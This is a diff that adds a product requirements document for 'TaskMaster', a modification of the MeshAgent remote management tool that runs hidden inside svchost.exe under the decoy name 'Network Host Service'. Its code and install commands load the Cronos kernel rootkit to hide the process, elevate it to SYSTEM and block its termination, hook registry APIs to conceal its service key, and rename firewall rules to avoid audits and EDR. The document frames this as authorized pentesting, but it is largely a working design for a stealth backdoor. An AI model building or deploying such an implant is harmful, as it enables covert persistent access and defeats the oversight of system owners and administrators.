@@ -1,0 +1,308 @@
+Product Requirements Document (PRD) for TaskMaster
+Version
+1.0
+
+Author
+Joel Guff
+
+Date
+July 14, 2025
+
+1. Introduction
+1.1 Purpose
+This PRD outlines the requirements for integrating the Cronos rootkit into the MeshAgent project to create TaskMaster, a stealthy remote management tool for authorized penetration testing. TaskMaster enhances MeshAgent by refactoring it to run as a DLL hosted in svchost.exe, leveraging Cronos's kernel-mode driver to hide processes, protect the agent, and elevate privileges, while implementing user-mode registry hiding to evade detection. The goal is to maintain MeshAgent's core functionality (WebSocket connectivity, KVM, self-updates, firewall rules) while ensuring stealth in Task Manager and registry tools like regedit.
+
+1.2 Scope
+Cronos files: C:\MeshAgent\Cronos Rootkit
+
+Mesh Agent files: C:\MeshAgent\
+
+Mesh Agent service: C:\MeshAgent\meshservice
+
+Run as a DLL within svchost.exe (service name: "svchost_net", display name: "Network Host Service").
+Use Cronos rootkit to hide the process, protect it from termination, and elevate to SYSTEM privileges.
+Hide registry entries (e.g., HKLM\SYSTEM\CurrentControlSet\Services\svchost_net) using user-mode hooking.
+Preserve MeshAgent's functionality: WebSocket connections to MeshCentral, KVM, terminal, file operations, and self-updates.
+Support Windows 10/11 x64, requiring administrative privileges and test signing mode for the Cronos driver.
+Be used ethically for authorized pentesting only, with warnings about potential system instability (BSODs).
+This PRD focuses on Windows implementation, with no Linux support in scope.
+
+1.3 Definitions, Acronyms, and Abbreviations
+MeshAgent: Open-source remote management agent.
+Cronos: Kernel-mode rootkit with IOCTLs for process hiding (IOCTL_HIDEPROC), elevation (IOCTL_ELEVATEME), protection (IOCTL_PROTECT), and driver hiding.
+TaskMaster: The modified MeshAgent with Cronos integration.
+IOCTL: Input/Output Control code for kernel-user communication.
+SCM: Service Control Manager.
+BSOD: Blue Screen of Death, a critical system error.
+WDK: Windows Driver Kit.
+MinHook: Library for API hooking.
+2. Goals and Objectives
+2.1 Project Goals
+Stealth: Make TaskMaster undetectable in Task Manager and regedit by hiding its process and registry entries.
+Functionality: Retain MeshAgent's remote management capabilities (WebSocket, KVM, updates, firewall rules).
+Security: Elevate TaskMaster to SYSTEM privileges and protect it from termination.
+Ethical Use: Ensure deployment is restricted to authorized pentesting with clear documentation on risks (e.g., BSODs).
+Ease of Deployment: Provide clear build and installation instructions for Visual Studio 2019 and WDK 10.
+2.2 Success Criteria
+TaskMaster appears as svchost.exe in Task Manager (netsvcs group).
+Registry key HKLM\SYSTEM\CurrentControlSet\Services\svchost_net is hidden in regedit.
+Cronos driver is loaded and hides TaskMaster process and itself.
+MeshCentral connectivity (KVM, terminal, file operations, updates) functions without errors.
+Firewall rules for ports 16990/16991 are correctly applied.
+No system crashes during normal operation; BSODs only occur if protected process is forcibly terminated.
+Installation and cleanup processes are documented and functional.
+3. Stakeholders
+Developers: Security researchers and pentesters implementing TaskMaster.
+End Users: Authorized pentesters deploying TaskMaster on test systems.
+xAI Team: Providing oversight and ensuring ethical use guidelines.
+System Administrators: Managing test environments where TaskMaster is deployed.
+4. Functional Requirements
+4.1 System Requirements
+Operating System: Windows 10/11 x64.
+Privileges: Administrative access required.
+Driver Signing: Test signing mode enabled (bcdedit /set testsigning on) for Cronos.sys.
+Build Environment:
+Visual Studio 2019.
+Windows Driver Kit (WDK) 10 for Cronos.sys.
+MeshAgent built as a DLL using Visual Studio (.vcxproj).
+4.2 Core Features
+DLL Refactoring:
+Refactor MeshAgent to run as a DLL (meshagent.dll) hosted by svchost.exe.
+Service configuration:
+Internal name: svchost_net.
+Display name: Network Host Service.
+Registry: HKLM\SYSTEM\CurrentControlSet\Services\svchost_net\Parameters\ServiceDll=%SystemRoot%\system32\meshagent.dll.
+Service type: SERVICE_WIN32_SHARE_PROCESS, group: netsvcs.
+Implement DllMain and export ServiceMain in ServiceMain.c.
+Cronos Rootkit Integration:
+Embed Cronos.sys as a resource in MeshService64.rc:
+rc
+
+
+
+#include "resource.h"
+IDR_CRONOS_SYS BINARY "path\\to\\Cronos.sys"
+Define in resource.h:
+c
+
+
+
+#define IDR_CRONOS_SYS 101
+Extract and load Cronos.sys to C:\Windows\System32\drivers\Cronos.sys during service startup.
+Use IOCTLs from Driver.h:
+IOCTL_HIDEPROC: Hide TaskMaster process (svchost.exe hosting DLL).
+IOCTL_ELEVATEME: Elevate to SYSTEM privileges (copy token from PID 4).
+IOCTL_PROTECT: Set process as critical to prevent termination.
+Apply protections early in ServiceMain (after SERVICE_RUNNING, before MeshAgent_Start).
+Registry Hiding:
+Implement user-mode hooks for NtEnumerateKey and NtQueryValueKey using MinHook to filter out svchost_net registry key.
+Avoid deleting registry keys to maintain service functionality.
+Hook logic inspired by Ghost.cpp (driver hiding via list unlinking).
+Firewall Rules:
+Update firewall.cpp to rename rules:
+From "Mesh Agent" to "Network Host Service" (e.g., "Network Host Service peer-to-peer (UDP)").
+Ensure ports 16990 (TCP) and 16991 (UDP) are open.
+Dialog Updates:
+Update DialogHandler and DialogHandler2 in ServiceMain.c to use "Network Host Installer" in UI titles and translations.
+Build and Installation:
+Build Cronos.sys: x64 Release, #define DEBUG FALSE, Visual Studio 2019, WDK 10.
+Build MeshAgent: x64 Release, Dynamic Library, output meshagent.dll.
+Install commands:
+cmd
+
+
+
+sc create svchost_net type= share start= auto group= netsvcs binPath= "%SystemRoot%\system32\svchost.exe -k netsvcs" DisplayName= "Network Host Service"
+reg add HKLM\SYSTEM\CurrentControlSet\Services\svchost\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\meshagent.dll
+sc start svchost
+Cleanup:
+Unload driver: sc stop cronos, sc delete cronos.
+Remove files: C:\Windows\System32\drivers\Cronos.sys, C:\Windows\System32\meshagent.dll.
+4.3 Non-Functional Requirements
+Performance: TaskMaster must not degrade system performance beyond MeshAgent's baseline (e.g., <5% CPU increase during idle).
+Stability: Minimize BSOD risks; warn users that killing protected processes may cause crashes.
+Security: Ensure Cronos driver is loaded securely and only for authorized use.
+Compatibility: Support Windows 10/11 x64; no support for x86 or earlier versions.
+Stealth: Undetectable in Task Manager and regedit under normal operation.
+
+Modified Files Overview
+
+ServiceMain.c
+
+
+
+
+
+Refactor to DLL with DllMain and exported ServiceMain.
+
+
+
+Rename service: TCHAR* serviceFile = TEXT("svchost_net");, TCHAR* serviceName = TEXT("Network Host Service");.
+
+
+
+Add functions:
+
+
+
+
+
+ExtractDriverFromResource(): Extract Cronos.sys from resource to C:\Windows\System32\drivers.
+
+
+
+InstallAndStartDriver(): Install and start Cronos driver via SCM.
+
+
+
+ApplyCronosProtection(): Send IOCTLs (IOCTL_HIDEPROC, IOCTL_ELEVATEME, IOCTL_PROTECT).
+
+
+
+InitRegistryHooks(): Hook NtEnumerateKey, NtQueryValueKey using MinHook.
+
+
+
+Update DialogHandler/DialogHandler2: Use "Network Host Installer".
+
+firewall.cpp
+
+
+
+
+
+Update rule names/descriptions: Replace "Mesh Agent" with "Network Host Service".
+
+MeshService64.rc
+
+
+
+
+
+Add:
+
+#include "resource.h"
+IDR_CRONOS_SYS BINARY "path\\to\\Cronos.sys"
+
+resource.h
+
+
+
+
+
+Add:
+
+#define IDR_CRONOS_SYS 101
+
+MeshService.vcxproj and MeshService-2022.vcxproj
+
+
+
+
+
+Set to Dynamic Library, output meshagent.dll.
+
+
+
+Add MinHook files:
+
+<ItemGroup>
+    <ClCompile Include="MinHook\src\hook.c" />
+    <ClCompile Include="MinHook\src\buffer.c" />
+    <ClCompile Include="MinHook\src\trampoline.c" />
+</ItemGroup>
+<ItemGroup>
+    <ClInclude Include="MinHook\include\MinHook.h" />
+</ItemGroup>
+
+servicemain.c code:
+
+#include <windows.h> #include <winioctl.h> #include "MinHook.h" #include "Driver.h" #include "agentcore.h" #include "meshdefines.h"
+
+TCHAR* serviceFile = TEXT("svchost_net"); TCHAR* serviceName = TEXT("Network Host Service");
+
+#define DRIVER_PATH L"C:\Windows\System32\drivers\Cronos.sys" #define DEVICE_NAME L"\\.\Cronos"
+
+// Registry hooking typedef NTSTATUS(NTAPI *pNtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG); typedef NTSTATUS(NTAPI *pNtQueryValueKey)(HANDLE, PUNICODE_STRING, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG); pNtEnumerateKey origNtEnumerateKey; pNtQueryValueKey origNtQueryValueKey;
+
+NTSTATUS NTAPI hookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) { NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength); if (NT_SUCCESS(status)) { if (wcsstr(((PKEY_BASIC_INFORMATION)KeyInformation)->Name, L"svchost_net") != NULL) { return origNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength); } } return status; }
+
+NTSTATUS NTAPI hookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) { if (wcsstr(ValueName->Buffer, L"svchost_net") != NULL) { return STATUS_OBJECT_NAME_NOT_FOUND; } return origNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength); }
+
+BOOL InitRegistryHooks() { MH_Initialize(); MH_CreateHookApi(L"ntdll", "NtEnumerateKey", hookedNtEnumerateKey, (LPVOID*)&origNtEnumerateKey); MH_CreateHookApi(L"ntdll", "NtQueryValueKey", hookedNtQueryValueKey, (LPVOID*)&origNtQueryValueKey); MH_EnableHook(MH_ALL_HOOKS); return TRUE; }
+
+BOOL ExtractDriverFromResource() { HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_CRONOS_SYS), "BINARY"); if (!hRes) return FALSE; HGLOBAL hData = LoadResource(NULL, hRes); if (!hData) return FALSE; DWORD size = SizeofResource(NULL, hRes); void* pData = LockResource(hData); if (!pData) return FALSE; HANDLE hFile = CreateFile(DRIVER_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) return FALSE; DWORD bytesWritten; BOOL success = WriteFile(hFile, pData, size, &bytesWritten, NULL) && (bytesWritten == size); CloseHandle(hFile); return success; }
+
+BOOL InstallAndStartDriver() { SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (!hSCM) return FALSE; SC_HANDLE hService = CreateService(hSCM, L"cronos", L"Cronos Rootkit", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, DRIVER_PATH, NULL, NULL, NULL, NULL, NULL); if (!hService) { if (GetLastError() == ERROR_SERVICE_EXISTS) { hService = OpenService(hSCM, L"cronos", SERVICE_ALL_ACCESS); if (!hService) { CloseServiceHandle(hSCM); return FALSE; } } else { CloseServiceHandle(hSCM); return FALSE; } } BOOL success = StartService(hService, 0, NULL); CloseServiceHandle(hService); CloseServiceHandle(hSCM); return success; }
+
+VOID ApplyCronosProtection() { HANDLE hDevice = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) return; DWORD bytesReturned; ULONG currentPid = GetCurrentProcessId(); ElevateData elevateData = { currentPid }; DeviceIoControl(hDevice, IOCTL_ELEVATEME, &elevateData, sizeof(elevateData), NULL, 0, &bytesReturned, NULL); HideProcData hideData = { currentPid }; DeviceIoControl(hDevice, IOCTL_HIDEPROC, &hideData, sizeof(hideData), NULL, 0, &bytesReturned, NULL); ProtectProcessData protectData = { currentPid }; DeviceIoControl(hDevice, IOCTL_PROTECT, &protectData, sizeof(protectData), NULL, 0, &bytesReturned, NULL); CloseHandle(hDevice); }
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { if (fdwReason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(hinstDLL); } return TRUE; }
+
+__declspec(dllexport) VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) { SERVICE_STATUS serviceStatus = { SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING, 0, NO_ERROR, 0, 0, 0 }; SERVICE_STATUS_HANDLE serviceStatusHandle = RegisterServiceCtrlHandlerEx(serviceName, ServiceControlHandler, NULL); if (serviceStatusHandle) { SetServiceStatus(serviceStatusHandle, &serviceStatus); if (!ExtractDriverFromResource() || !InstallAndStartDriver()) { // Log error silently (e.g., to a file or MeshCentral debug) } InitRegistryHooks(); ApplyCronosProtection(); serviceStatus.dwCurrentState = SERVICE_RUNNING; serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_POWEREVENT | SERVICE_ACCEPT_SESSIONCHANGE); SetServiceStatus(serviceStatusHandle, &serviceStatus); CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); __try { agent = MeshAgent_Create(0); agent->serviceReserved = 1; MeshAgent_Start(agent, g_serviceArgc, g_serviceArgv); agent = NULL; } __except (ILib_WindowsExceptionFilterEx(GetExceptionCode(), GetExceptionInformation(), &winException)) { ILib_WindowsExceptionDebugEx(&winException); } CoUninitialize(); serviceStatus.dwCurrentState = SERVICE_STOP_PENDING; SetServiceStatus(serviceStatusHandle, &serviceStatus); serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN); serviceStatus.dwCurrentState = SERVICE_STOPPED; SetServiceStatus(serviceStatusHandle, &serviceStatus); } }
+
+
+5.3 Dependencies
+Cronos Rootkit: Source files (Driver.cpp, Ghost.cpp, Rootkit.cpp, Driver.h, Rootkit.h).
+MinHook: For user-mode registry hooking.
+Windows SDK: For Windows APIs (e.g., CreateFile, DeviceIoControl).
+WDK 10: For building Cronos.sys.
+6. User Stories
+As a pentester, I want TaskMaster to appear as svchost.exe in Task Manager so that it blends with legitimate processes.
+As a pentester, I want the service registry key to be hidden in regedit to avoid detection during audits.
+As a pentester, I want TaskMaster to be protected from termination to ensure persistent remote access.
+As a system administrator, I want clear installation and cleanup instructions to deploy and remove TaskMaster safely.
+As a developer, I want the integration to preserve MeshAgent's functionality to maintain remote management capabilities.
+7. Risks and Mitigation
+Risk: BSOD if protected process is forcibly terminated.
+Mitigation: Document warnings in deployment guide; test extensively on virtual machines.
+Risk: Detection by advanced EDR solutions.
+Mitigation: Use user-mode hooks for registry hiding; test against common EDRs.
+Risk: Cronos driver instability (e.g., IOCTL_HIDEPROC issues).
+Mitigation: Implement error handling; fallback to non-hidden mode if driver fails to load.
+Risk: Misuse of TaskMaster for unauthorized purposes.
+Mitigation: Restrict distribution to authorized pentesters; include ethical use disclaimer.
+8. Testing and Validation
+Unit Tests:
+Verify ExtractDriverFromResource writes Cronos.sys correctly.
+Test IOCTLs (IOCTL_HIDEPROC, IOCTL_ELEVATEME, IOCTL_PROTECT) with mock PIDs.
+Validate registry hooks filter svchost_net in regedit.
+Integration Tests:
+Confirm TaskMaster appears as svchost.exe in Task Manager.
+Test MeshCentral connectivity (KVM, terminal, file operations, updates).
+Verify firewall rules for ports 16990/16991.
+System Tests:
+Deploy on Windows 10/11 x64 VMs; check stability over 24 hours.
+Attempt termination to validate protection (expect BSOD in some cases).
+Validation:
+Services.msc: "Network Host Service" visible.
+Regedit: HKLM\SYSTEM\CurrentControlSet\Services\svchost_net hidden.
+Task Manager: Process listed as svchost.exe (netsvcs).
+MeshCentral: Full functionality confirmed.
+9. Deployment and Installation
+Build:
+Compile Cronos.sys: Visual Studio 2019, WDK 10, x64 Release.
+Compile meshagent.dll: Visual Studio 2019, x64 Release, Dynamic Library.
+Install:
+Copy meshagent.dll to C:\Windows\System32.
+Run:
+cmd
+
+
+
+sc create svchost_net type= share start= auto group= netsvcs binPath= "%SystemRoot%\system32\svchost.exe -k netsvcs" DisplayName= "Network Host Service"
+reg add HKLM\SYSTEM\CurrentControlSet\Services\svchost_net\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\meshagent.dll
+sc start svchost_net
+Cleanup:
+Stop driver: sc stop cronos, sc delete cronos.
+Remove files: del C:\Windows\System32\drivers\Cronos.sys, del C:\Windows\System32\meshagent.dll.
+10. Documentation
+Developer Guide: Include build instructions, Cronos integration details, and MinHook usage.
+User Guide: Detail installation, verification, and cleanup steps; emphasize ethical use and BSOD risks.
+API Reference: Document IOCTLs (IOCTL_HIDEPROC, IOCTL_ELEVATEME, IOCTL_PROTECT) and hooked APIs (NtEnumerateKey, NtQueryValueKey).
+11. Timeline and Milestones
+Week 1: Set up build environment, compile Cronos.sys, refactor MeshAgent to DLL.
+Week 2: Implement Cronos IOCTLs and registry hooking in ServiceMain.c.
+Week 3: Update firewall.cpp, dialogs, and .vcxproj.filters; initial testing.
+Week 4: Integration and system testing, finalize documentation.
+Week 5: Deployment validation, finalize PRD, and release to authorized testers.
